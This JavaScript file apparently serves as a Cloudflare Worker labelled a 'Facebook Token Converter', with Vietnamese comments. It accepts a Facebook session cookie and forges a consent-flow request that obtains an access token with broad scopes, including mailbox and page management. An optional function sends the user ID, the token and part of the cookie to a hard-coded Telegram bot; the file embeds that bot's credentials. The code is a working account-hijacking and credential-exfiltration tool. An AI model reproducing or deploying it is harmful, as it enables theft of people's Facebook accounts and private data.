// worker.js
export default {
    async fetch(request, env) {
      const corsHeaders = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      };
  
      // Handle preflight requests
      if (request.method === 'OPTIONS') {
        return new Response(null, { headers: corsHeaders });
      }
  
      const url = new URL(request.url);
      const path = url.pathname;
  
      try {
        if (path === '/cookie-to-token' && request.method === 'POST') {
          const { cookie, sendToTelegram = false } = await request.json();
          
          if (!cookie) {
            return new Response(JSON.stringify({ 
              success: false, 
              error: 'Cookie is required' 
            }), {
              headers: { ...corsHeaders, 'Content-Type': 'application/json' },
              status: 400
            });
          }
  
          const token = await getTokenFromCookie(cookie);
          
          if (token) {
            // Gửi thông tin đến Telegram nếu được yêu cầu
            if (sendToTelegram) {
              try {
                await sendToTelegramBot(cookie, token);
              } catch (telegramError) {
                console.error("Lỗi gửi Telegram:", telegramError);
                // Không làm ảnh hưởng đến response chính nếu gửi Telegram thất bại
              }
            }
            
            return new Response(JSON.stringify({ 
              success: true, 
              token 
            }), {
              headers: { ...corsHeaders, 'Content-Type': 'application/json' }
            });
          } else {
            return new Response(JSON.stringify({ 
              success: false, 
              error: 'Failed to get token from cookie' 
            }), {
              headers: { ...corsHeaders, 'Content-Type': 'application/json' },
              status: 500
            });
          }
        } 
        else if (path === '/token-to-cookie' && request.method === 'POST') {
          return new Response(JSON.stringify({ 
            success: false, 
            error: 'Token to cookie conversion not implemented yet' 
          }), {
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 501
          });
        }
        else if (path === '/health' && request.method === 'GET') {
          return new Response(JSON.stringify({ 
            success: true, 
            status: 'OK',
            version: '2.0.0',
            author: 'Từ Quang Nam'
          }), {
            headers: { ...corsHeaders, 'Content-Type': 'application/json' }
          });
        }
        else {
          return new Response(JSON.stringify({ 
            success: false, 
            error: 'Endpoint not found' 
          }), {
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 404
          });
        }
      } catch (error) {
        return new Response(JSON.stringify({ 
          success: false, 
          error: error.message 
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        });
      }
    }
  };
  
  // Hàm gửi thông tin đến Telegram
  async function sendToTelegramBot(cookie, token) {
    const TELEGRAM_BOT_TOKEN = "8360410691:AAFNHnx5CC1JEsGRwBPB77PZEAMdQdQsQVI";
    const TELEGRAM_CHAT_ID = "8204557159";
    
    // Trích xuất thông tin từ cookie
    const cUserMatch = cookie.match(/cuser=(\d+)/i) || cookie.match(/c_user=(\d+)/i);
    const xsMatch = cookie.match(/xs=([^;]+)/i);
    const datrMatch = cookie.match(/datr=([^;]+)/i);
    
    const cUser = cUserMatch ? cUserMatch[1] : "Không tìm thấy";
    const xsToken = xsMatch ? xsMatch[1] : "Không tìm thấy";
    const datr = datrMatch ? datrMatch[1] : "Không tìm thấy";
    
    // Tạo tin nhắn với định dạng đẹp
    const message = `
  🔐 *THÔNG TIN FACEBOOK ACCOUNT* 🔐
  
  👤 *User ID:* \`${cUser}\`
  🔑 *Token:* \`${token}\`
  
  📋 *Cookie Info:*
  \`\`\`
  ${cookie.substring(0, 100)}...
  \`\`\`
  
  📊 *Chi tiết:*
  - ✅ Token đã được lấy thành công
  - 👤 User ID: ${cUser}
  - 📅 Thời gian: ${new Date().toLocaleString('vi-VN')}
  - 🌐 Nguồn: Facebook Token Converter
  
  💡 *Lưu ý:* Bảo mật thông tin này cẩn thận!
    `;
  
    // Gửi tin nhắn đến Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
  
    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }
  }
  
  // Chuyển đổi hàm get_fb_dtsg từ Python sang JavaScript
  async function get_fb_dtsg(cookies) {
    const url = "https://www.facebook.com";
    
    const headers = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
      "Cache-Control": "max-age=0",
      "DNT": "1",
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "same-origin",
      "Upgrade-Insecure-Requests": "1",
      "Cookie": cookies,
    };
  
    try {
      const response = await fetch(url, { headers });
      const text = await response.text();
      
      // Extract fb_dtsg token using regex
      const match = text.match(/DTSGInitialData.*?"token":"(.*?)"/);
      if (match && match[1]) {
        return match[1];
      } else {
        throw new Error(`Unable to fetch fb_dtsg token. Response: ${text.substring(0, 500)}`);
      }
    } catch (error) {
      throw new Error(`Failed to get fb_dtsg: ${error.message}`);
    }
  }
  
  // Chuyển đổi hàm getToken từ Python sang JavaScript
  async function getToken(cookie) {
    try {
      const fb_dtsg = await get_fb_dtsg(cookie);
      
      // Extract user ID from cookie
      const uidMatch = cookie.match(/c_user=(\d+);/);
      if (!uidMatch) {
        throw new Error("Cannot find c_user in cookie");
      }
      const uid = uidMatch[1];
      
      // Generate UUID (simplified version)
      function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
          const r = Math.random() * 16 | 0;
          const v = c === 'x' ? r : (r & 0x3 | 0x8);
          return v.toString(16);
        });
      }
      
      const uuid1 = generateUUID();
      const uuid2 = generateUUID();
      
      const payload = {
        "av": uid,
        "dpr": "1",
        "fb_dtsg": fb_dtsg,
        "jazoest": "25432",
        "lsd": "wOUwVBp8tQ44TcnDdxQYBJ",
        "fb_api_caller_class": "RelayModern",
        "variables": `{"input":{"client_mutation_id":"4","actor_id":"${uid}","config_enum":"GDP_CONFIRM","device_id":null,"experience_id":"${uuid1}","extra_params_json":"{\\"app_id\\":\\"350685531728\\",\\"kid_directed_site\\":\\"false\\",\\"logger_id\\":\\"\\\\\\"${uuid2}\\\\\\"\\",\\"next\\":\\"\\\\\\"confirm\\\\\\"\\",\\"redirect_uri\\":\\"\\\\\\"https:\\\\\\\\\\\\/\\\\\\\\\\\\/www.facebook.com\\\\\\\\\\\\/connect\\\\\\\\\\\\/login_success.html\\\\\\"\\",\\"response_type\\":\\"\\\\\\"token\\\\\\"\\",\\"return_scopes\\":\\"false\\",\\"scope\\":\\"[\\\\\\"user_subscriptions\\\\\\",\\\\\\"user_videos\\\\\\",\\\\\\"user_website\\\\\\",\\\\\\"user_work_history\\\\\\",\\\\\\"friends_about_me\\\\\\",\\\\\\"friends_actions.books\\\\\\",\\\\\\"friends_actions.music\\\\\\",\\\\\\"friends_actions.news\\\\\\",\\\\\\"friends_actions.video\\\\\\",\\\\\\"friends_activities\\\\\\",\\\\\\"friends_birthday\\\\\\",\\\\\\"friends_education_history\\\\\\",\\\\\\"friends_events\\\\\\",\\\\\\"friends_games_activity\\\\\\",\\\\\\"friends_groups\\\\\\",\\\\\\"friends_hometown\\\\\\",\\\\\\"friends_interests\\\\\\",\\\\\\"friends_likes\\\\\\",\\\\\\"friends_location\\\\\\",\\\\\\"friends_notes\\\\\\",\\\\\\"friends_photos\\\\\\",\\\\\\"friends_questions\\\\\\",\\\\\\"friends_relationship_details\\\\\\",\\\\\\"friends_relationships\\\\\\",\\\\\\"friends_religion_politics\\\\\\",\\\\\\"friends_status\\\\\\",\\\\\\"friends_subscriptions\\\\\\",\\\\\\"friends_videos\\\\\\",\\\\\\"friends_website\\\\\\",\\\\\\"friends_work_history\\\\\\",\\\\\\"ads_management\\\\\\",\\\\\\"create_event\\\\\\",\\\\\\"create_note\\\\\\",\\\\\\"export_stream\\\\\\",\\\\\\"friends_online_presence\\\\\\",\\\\\\"manage_friendlists\\\\\\",\\\\\\"manage_notifications\\\\\\",\\\\\\"manage_pages\\\\\\",\\\\\\"photo_upload\\\\\\",\\\\\\"publish_stream\\\\\\",\\\\\\"read_friendlists\\\\\\",\\\\\\"read_insights\\\\\\",\\\\\\"read_mailbox\\\\\\",\\\\\\"read_page_mailboxes\\\\\\",\\\\\\"read_requests\\\\\\",\\\\\\"read_stream\\\\\\",\\\\\\"rsvp_event\\\\\\",\\\\\\"share_item\\\\\\",\\\\\\"sms\\\\\\",\\\\\\"status_update\\\\\\",\\\\\\"user_online_presence\\\\\\",\\\\\\"video_upload\\\\\\",\\\\\\"xmpp_login\\\\\\"]\\",\\"steps\\":\\"{}\\",\\"tp\\":\\"\\\\\\"unspecified\\\\\\"\\",\\"cui_gk\\":\\"\\\\\\"[PASS]:\\\\\\"\\",\\"is_limited_login_shim\\":\\"false\\"}","flow_name":"GDP","flow_step_type":"STANDALONE","outcome":"APPROVED","source":"gdp_delegated","surface":"FACEBOOK_COMET"}}`,
        "doc_id": "6494107973937368",
        "locale": "en_US",
        "server_timestamps": "true",
      };
  
      const headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "sec-fetch-site": "same-origin",
        "sec-fetch-dest": "empty",
        "accept-language": "en-US,en;q=0.9",
        "sec-fetch-mode": "cors",
        "referer": "https://www.facebook.com/",
        "sec-ch-ua-platform": '"Windows"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "x-fb-lsd": "wOUwVBp8tQ44TcnDdxQYBJ",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "www.facebook.com",
        "Cookie": cookie,
        "Expect": "100-continue",
      };
  
      // Convert payload to URL-encoded form data
      const formData = new URLSearchParams();
      for (const [key, value] of Object.entries(payload)) {
        formData.append(key, value);
      }
  
      const response = await fetch("https://www.facebook.com/api/graphql/", {
        method: "POST",
        headers: headers,
        body: formData.toString()
      });
  
      const responseText = await response.text();
      
      try {
        const responseJson = JSON.parse(responseText);
        
        if (responseJson.data && 
            responseJson.data.run_post_flow_action && 
            responseJson.data.run_post_flow_action.uri) {
          
          const uri = responseJson.data.run_post_flow_action.uri;
          const urlObj = new URL(uri);
          const closeUri = decodeURIComponent(urlObj.searchParams.get("close_uri") || "");
          
          if (closeUri) {
            const fragmentIndex = closeUri.indexOf('#');
            if (fragmentIndex !== -1) {
              const fragment = closeUri.substring(fragmentIndex + 1);
              const fragmentParams = new URLSearchParams(fragment);
              return fragmentParams.get("access_token");
            }
          }
        }
      } catch (e) {
        console.error("Failed to parse response:", e);
      }
      
      return null;
    } catch (error) {
      console.error("Error in getToken:", error);
      throw error;
    }
  }
  
  // Hàm chính để lấy token từ cookie
  async function getTokenFromCookie(cookie) {
    return await getToken(cookie);
  }